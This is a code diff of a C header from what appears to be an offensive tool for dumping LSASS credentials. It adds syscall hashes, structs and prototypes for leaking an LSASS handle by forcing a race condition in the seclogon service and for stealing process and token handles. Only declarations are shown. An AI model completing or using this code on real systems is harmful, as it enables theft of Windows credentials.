@@ -12,8 +12,6 @@
 #define MAX_HANDLES 10000
 #define INVALID_HANDLE 6
 
-#define CreateProcessWithLogonW_SW2_HASH 0x39A92305
-
 typedef struct _HANDLE_LIST
 {
     ULONG Count;
@@ -30,10 +28,34 @@ struct TEB
     struct _PEB* ProcessEnvironmentBlock;
 };
 
-typedef BOOL(WINAPI* CreateProcessWithLogonW_t) (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
+{
+    ULONG NumberOfProcessIdsInList;
+    ULONG_PTR ProcessIdList[1];
+} FILE_PROCESS_IDS_USING_FILE_INFORMATION, * PFILE_PROCESS_IDS_USING_FILE_INFORMATION;
 
-PHANDLE_LIST find_process_handles_in_lsass(
-    IN DWORD lsass_pid);
+typedef struct _THREAD_PARAMETERS
+{
+    DWORD pid;
+    LPWSTR cmdline;
+    PBOOL file_lock_was_triggered;
+} THREAD_PARAMETERS, *PTHREAD_PARAMETERS;
+
+#define FileProcessIdsUsingFileInformation 47
+
+typedef BOOL(WINAPI* CreateProcessWithLogonW_t) (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef BOOL(WINAPI* CreateProcessWithTokenW_t) (HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+
+#define CreateProcessWithLogonW_SW2_HASH 0x39A92305
+#define CreateProcessWithTokenW_SW2_HASH 0x03A92535
+
+PHANDLE_LIST find_token_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions);
+
+PHANDLE_LIST find_process_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions);
 
 VOID change_pid(
     IN DWORD new_pid,
@@ -78,6 +100,27 @@ BOOL malseclogon_stage_1(
     IN BOOL use_malseclogon_locally,
     IN DWORD lsass_pid,
     OUT PPROCESS_LIST process_list);
+
+VOID malseclogon_trigger_lock(
+    IN DWORD lsass_pid,
+    IN LPWSTR cmdline,
+    IN PBOOL file_lock_was_triggered);
+
+DWORD WINAPI thread_seclogon_lock(
+    IN LPVOID lpParam);
+
+BOOL leak_lsass_handle_in_seclogon_with_race_condition(
+    IN DWORD lsass_pid,
+    OUT PHANDLE hEvent,
+    OUT PHANDLE hFile);
+
+DWORD get_pid_using_file_path(
+    IN LPWSTR file_path);
+
+DWORD get_seclogon_pid(VOID);
+
+HANDLE malseclogon_race_condition(
+    IN DWORD lsass_pid);
 
 #ifdef EXE
 HANDLE malseclogon_stage_2(
